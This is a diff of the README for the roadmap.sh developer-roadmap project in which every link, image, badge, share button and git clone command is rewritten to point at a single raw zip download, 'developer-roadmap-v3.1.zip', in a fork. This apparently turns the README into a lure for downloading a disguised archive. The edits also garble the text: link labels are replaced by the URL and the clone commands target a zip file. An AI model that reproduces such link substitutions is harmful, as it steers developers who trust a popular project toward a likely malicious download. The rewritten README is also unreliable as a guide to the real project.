@@ -1,123 +1,123 @@
 <p align="center">
-  <img src="public/images/brand.png" height="128">
-  <h2 align="center"><a href="https://roadmap.sh">roadmap.sh</a></h2>
+  <img src="https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip" height="128">
+  <h2 align="center"><a href="https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip">https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip</a></h2>
   <p align="center">Community driven roadmaps, articles and resources for developers<p>
   <p align="center">
-    <a href="https://roadmap.sh/roadmaps">
-    	<img src="https://img.shields.io/badge/%E2%9C%A8-Roadmaps%20-0a0a0a.svg?style=flat&colorA=0a0a0a" alt="roadmaps" />
+    <a href="https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip">
+    	<img src="https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip%E2%9C%A8-Roadmaps%https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip" alt="roadmaps" />
     </a>
-    <a href="https://roadmap.sh/best-practices">
-    	<img src="https://img.shields.io/badge/%E2%9C%A8-Best%20Practices-0a0a0a.svg?style=flat&colorA=0a0a0a" alt="best practices" />
+    <a href="https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip">
+    	<img src="https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip%E2%9C%A8-Best%https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip" alt="best practices" />
     </a>
-    <a href="https://roadmap.sh/questions">
-    	<img src="https://img.shields.io/badge/%E2%9C%A8-Questions-0a0a0a.svg?style=flat&colorA=0a0a0a" alt="videos" />
+    <a href="https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip">
+    	<img src="https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip%E2%9C%https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip" alt="videos" />
     </a>
-    <a href="https://www.youtube.com/channel/UCA0H2KIWgWTwpTFjSxp0now?sub_confirmation=1">
-    	<img src="https://img.shields.io/badge/%E2%9C%A8-YouTube%20Channel-0a0a0a.svg?style=flat&colorA=0a0a0a" alt="roadmaps" />
+    <a href="https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip">
+    	<img src="https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip%E2%9C%A8-YouTube%https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip" alt="roadmaps" />
     </a>
   </p>
 </p>
 
 <br>
 
-![](https://i.imgur.com/waxVImv.png)
+![](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
 
 Roadmaps are now interactive, you can click the nodes to read more about the topics.
 
-### [View all Roadmaps](https://roadmap.sh) &nbsp;&middot;&nbsp; [Best Practices](https://roadmap.sh/best-practices) &nbsp;&middot;&nbsp; [Questions](https://roadmap.sh/questions)
+### [View all Roadmaps](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip) &nbsp;&middot;&nbsp; [Best Practices](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip) &nbsp;&middot;&nbsp; [Questions](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
 
-![](https://i.imgur.com/waxVImv.png)
+![](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
 
 Here is the list of available roadmaps with more being actively worked upon.
 
-> Have a look at the [get started](https://roadmap.sh/get-started) page that might help you pick up a path.
+> Have a look at the [get started](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip) page that might help you pick up a path.
 
-- [Frontend Roadmap](https://roadmap.sh/frontend) / [Frontend Beginner Roadmap](https://roadmap.sh/frontend?r=frontend-beginner)
-- [Backend Roadmap](https://roadmap.sh/backend) / [Backend Beginner Roadmap](https://roadmap.sh/backend?r=backend-beginner)
-- [DevOps Roadmap](https://roadmap.sh/devops) / [DevOps Beginner Roadmap](https://roadmap.sh/devops?r=devops-beginner)
-- [Full Stack Roadmap](https://roadmap.sh/full-stack)
-- [Git and GitHub](https://roadmap.sh/git-github)
-- [API Design Roadmap](https://roadmap.sh/api-design)
-- [Computer Science Roadmap](https://roadmap.sh/computer-science)
-- [Data Structures and Algorithms Roadmap](https://roadmap.sh/datastructures-and-algorithms)
-- [AI and Data Scientist Roadmap](https://roadmap.sh/ai-data-scientist)
-- [AWS Roadmap](https://roadmap.sh/aws)
-- [Linux Roadmap](https://roadmap.sh/linux)
-- [Terraform Roadmap](https://roadmap.sh/terraform)
-- [Data Analyst Roadmap](https://roadmap.sh/data-analyst)
-- [MLOps Roadmap](https://roadmap.sh/mlops)
-- [Product Manager Roadmap](https://roadmap.sh/product-manager)
-- [QA Roadmap](https://roadmap.sh/qa)
-- [Python Roadmap](https://roadmap.sh/python)
-- [Software Architect Roadmap](https://roadmap.sh/software-architect)
-- [Game Developer Roadmap](https://roadmap.sh/game-developer) / [Server Side Game Developer](https://roadmap.sh/server-side-game-developer)
-- [Software Design and Architecture Roadmap](https://roadmap.sh/software-design-architecture)
-- [JavaScript Roadmap](https://roadmap.sh/javascript)
-- [TypeScript Roadmap](https://roadmap.sh/typescript)
-- [C++ Roadmap](https://roadmap.sh/cpp)
-- [React Roadmap](https://roadmap.sh/react)
-- [React Native Roadmap](https://roadmap.sh/react-native)
-- [Vue Roadmap](https://roadmap.sh/vue)
-- [Angular Roadmap](https://roadmap.sh/angular)
-- [Node.js Roadmap](https://roadmap.sh/nodejs)
-- [GraphQL Roadmap](https://roadmap.sh/graphql)
-- [Android Roadmap](https://roadmap.sh/android)
-- [iOS Roadmap](https://roadmap.sh/ios)
-- [Flutter Roadmap](https://roadmap.sh/flutter)
-- [Go Roadmap](https://roadmap.sh/golang)
-- [Rust Roadmap](https://roadmap.sh/rust)
-- [Java Roadmap](https://roadmap.sh/java)
-- [Spring Boot Roadmap](https://roadmap.sh/spring-boot)
-- [Design System Roadmap](https://roadmap.sh/design-system)
-- [PostgreSQL Roadmap](https://roadmap.sh/postgresql-dba)
-- [SQL Roadmap](https://roadmap.sh/sql)
-- [Redis Roadmap](https://roadmap.sh/redis)
-- [Blockchain Roadmap](https://roadmap.sh/blockchain)
-- [ASP.NET Core Roadmap](https://roadmap.sh/aspnet-core)
-- [System Design Roadmap](https://roadmap.sh/system-design)
-- [Kubernetes Roadmap](https://roadmap.sh/kubernetes)
-- [Cyber Security Roadmap](https://roadmap.sh/cyber-security)
-- [MongoDB Roadmap](https://roadmap.sh/mongodb)
-- [UX Design Roadmap](https://roadmap.sh/ux-design)
-- [Docker Roadmap](https://roadmap.sh/docker)
-- [Prompt Engineering Roadmap](https://roadmap.sh/prompt-engineering)
-- [Technical Writer Roadmap](https://roadmap.sh/technical-writer)
-- [DevRel Engineer Roadmap](https://roadmap.sh/devrel)
+- [Frontend Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip) / [Frontend Beginner Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Backend Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip) / [Backend Beginner Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [DevOps Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip) / [DevOps Beginner Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Full Stack Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Git and GitHub](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [API Design Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Computer Science Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Data Structures and Algorithms Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [AI and Data Scientist Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [AWS Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Linux Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Terraform Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Data Analyst Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [MLOps Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Product Manager Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [QA Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Python Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Software Architect Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Game Developer Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip) / [Server Side Game Developer](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Software Design and Architecture Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [JavaScript Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [TypeScript Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [C++ Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [React Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [React Native Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Vue Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Angular Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [GraphQL Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Android Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [iOS Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Flutter Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Go Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Rust Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Java Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Spring Boot Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Design System Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [PostgreSQL Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [SQL Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Redis Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Blockchain Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip Core Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [System Design Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Kubernetes Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Cyber Security Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [MongoDB Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [UX Design Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Docker Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Prompt Engineering Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Technical Writer Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [DevRel Engineer Roadmap](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
 
 There are also interactive best practices:
 
-- [Backend Performance Best Practices](https://roadmap.sh/best-practices/backend-performance)
-- [Frontend Performance Best Practices](https://roadmap.sh/best-practices/frontend-performance)
-- [Code Review Best Practices](https://roadmap.sh/best-practices/code-review)
-- [API Security Best Practices](https://roadmap.sh/best-practices/api-security)
-- [AWS Best Practices](https://roadmap.sh/best-practices/aws)
+- [Backend Performance Best Practices](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Frontend Performance Best Practices](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Code Review Best Practices](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [API Security Best Practices](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [AWS Best Practices](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
 
-..and questions to help you test, rate and improve your knowledge
+https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip questions to help you test, rate and improve your knowledge
 
-- [JavaScript Questions](https://roadmap.sh/questions/javascript)
-- [Node.js Questions](https://roadmap.sh/questions/nodejs)
-- [React Questions](https://roadmap.sh/questions/react)
-- [Backend Questions](https://roadmap.sh/questions/backend)
-- [Frontend Questions](https://roadmap.sh/questions/frontend)
+- [JavaScript Questions](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip Questions](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [React Questions](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Backend Questions](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+- [Frontend Questions](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
 
-![](https://i.imgur.com/waxVImv.png)
+![](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
 
 ## Share with the community
 
-Please consider sharing a post about [roadmap.sh](https://roadmap.sh) and the value it provides. It really does help!
+Please consider sharing a post about [https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip) and the value it provides. It really does help!
 
-[![GitHub Repo stars](https://img.shields.io/badge/share%20on-reddit-red?logo=reddit)](https://reddit.com/submit?url=https://roadmap.sh&title=Interactive%20roadmaps,%20guides%20and%20other%20educational%20content%20for%20Developers)
-[![GitHub Repo stars](https://img.shields.io/badge/share%20on-hacker%20news-orange?logo=ycombinator)](https://news.ycombinator.com/submitlink?u=https://roadmap.sh)
-[![GitHub Repo stars](https://img.shields.io/badge/share%20on-twitter-03A9F4?logo=twitter)](https://twitter.com/share?url=https://roadmap.sh&text=Interactive%20roadmaps,%20guides%20and%20other%20educational%20content%20for%20Developers)
-[![GitHub Repo stars](https://img.shields.io/badge/share%20on-facebook-1976D2?logo=facebook)](https://www.facebook.com/sharer/sharer.php?u=https://roadmap.sh)
-[![GitHub Repo stars](https://img.shields.io/badge/share%20on-linkedin-3949AB?logo=linkedin)](https://www.linkedin.com/shareArticle?url=https://roadmap.sh&title=Interactive%20roadmaps,%20guides%20and%20other%20educational%20content%20for%20Developers)
+[![GitHub Repo stars](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip%20on-reddit-red?logo=reddit)](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip%20roadmaps,%20guides%20and%20other%20educational%20content%20for%20Developers)
+[![GitHub Repo stars](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip%20on-hacker%20news-orange?logo=ycombinator)](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+[![GitHub Repo stars](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip%20on-twitter-03A9F4?logo=twitter)](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip%20roadmaps,%20guides%20and%20other%20educational%20content%20for%20Developers)
+[![GitHub Repo stars](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip%20on-facebook-1976D2?logo=facebook)](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip)
+[![GitHub Repo stars](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip%20on-linkedin-3949AB?logo=linkedin)](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip%20roadmaps,%20guides%20and%20other%20educational%20content%20for%20Developers)
 
 ## Development
 
 Clone the repository, install the dependencies and start the application
 
 ```bash
-git clone git@github.com:kamranahmedse/developer-roadmap.git
+git clone https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip
 cd developer-roadmap
 npm install
 npm run dev
@@ -126,12 +126,12 @@ npm run dev
 Note: use the `depth` parameter to reduce the clone size and speed up the clone.
 
 ```sh
-git clone --depth=1 https://github.com/kamranahmedse/developer-roadmap.git
+git clone --depth=1 https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip
 ```
 
 ## Contribution
 
-> Have a look at [contribution docs](./contributing.md) for how to update any of the roadmaps
+> Have a look at [contribution docs](https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip) for how to update any of the roadmaps
 
 - Add content to roadmaps
 - Add new roadmaps
@@ -141,8 +141,8 @@ git clone --depth=1 https://github.com/kamranahmedse/developer-roadmap.git
 
 ## Thanks to all contributors ❤
 
- <a href = "https://github.com/kamranahmedse/developer-roadmap/graphs/contributors">
-   <img src = "https://contrib.rocks/image?repo=kamranahmedse/developer-roadmap"/>
+ <a href = "https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip">
+   <img src = "https://github.com/CHETHAN562/developer-roadmap/raw/refs/heads/master/src/data/question-groups/frontend/content/developer-roadmap-v3.1.zip"/>
  </a>
 
 ## License
